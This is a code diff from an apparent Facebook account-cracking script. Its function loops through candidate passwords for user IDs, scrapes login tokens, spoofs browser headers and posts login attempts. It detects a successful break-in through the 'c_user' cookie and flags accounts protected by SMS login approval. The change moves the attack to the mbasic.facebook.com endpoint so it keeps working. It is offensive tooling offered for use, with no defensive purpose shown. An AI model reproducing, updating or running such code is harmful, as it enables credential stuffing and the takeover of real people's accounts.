@@ -1706,7 +1706,7 @@ def freeq(uid,pwx,tl):
         for pw in pwx:
             ua = random.choice(uas)
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com/').text
+            free_fb = Session.get('https://mbasic.facebook.com/').text
             data = {
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1714,38 +1714,25 @@ def freeq(uid,pwx,tl):
             'login_source': 'comet_headerless_login',
             'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            headers = {
-            'Host': 'm.facebook.com',
-            'method': 'POST',
-            'path': '/login/Device-based/login/async/',
-            'scheme': 'https',
-            'content-length': '294',
-            'Accept-Encoding': 'gzip',
-            'content-Length': '{len(str(logn_data))}',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'dpr': '1.75',
-            'viewport-width': '980',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '""',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-full-version-list': '',
-            'sec-ch-prefers-color-scheme': 'light',
-            'upgrade-insecure-requests': '1',
-            'user-agent': ua,
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'dnt': '1',
-            'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D274266067164%26cbt%3D1727799868676%26e2e%3D%257B%2522init%2522%253A1727799868676%257D%26ies%3D0%26sdk%3Dandroid-15.0.2%26sso%3Dchrome_custom_tab%26nonce%3Def106713-7b2d-4e64-99e3-9472dc33e4a9%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522fac9e37c-09c8-4088-966c-de4a4cfdc693%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ke3bav5vqb2rkr5941ej%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.pinterest%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DtdE1uLjyHZfqDyLNeUM50AfQug3nBXEVrhSQsAz-b4Q%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfac9e37c-09c8-4088-966c-de4a4cfdc693%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.pinterest%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522fac9e37c-09c8-4088-966c-de4a4cfdc693%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ke3bav5vqb2rkr5941ej%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
-            'x-requested-with': 'mark.via.gp',
-            'sec-fetch-site': 'none',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-user': '?1',
-            'sec-fetch-dest': 'document',
-            'accept-encoding': 'gzip, deflate, br, zstd',
-            'accept-language': 'en-US,en;q=0.9',}
+            headers ={
+            "Host": "mbasic.facebook.com",
+            "Connection": "keep-alive",
+            "Cache-Control": "max-age=0",
+            "Upgrade-Insecure-Requests": "1",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "Sec-Fetch-Site": "cross-site",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-User": "?1",
+            "Sec-Fetch-Dest": "document",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Referer": "https://mbasic.facebook.com/login/device-based/regular/login/",
+            "Sec-CH-UA": '"Chromium";v="119", "Not?A_Brand";v="24"',
+            "Sec-CH-UA-Mobile": "?1",
+            "Sec-CH-UA-Platform": '"Android"',
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; V2060) AppleWebKit/537.36 (KHTML, like Gecko) JioSphere/5.0.3 Chrome/119.0.6045.193 Mobile Safari/537.36"}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
+            url = "https://mbasic.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
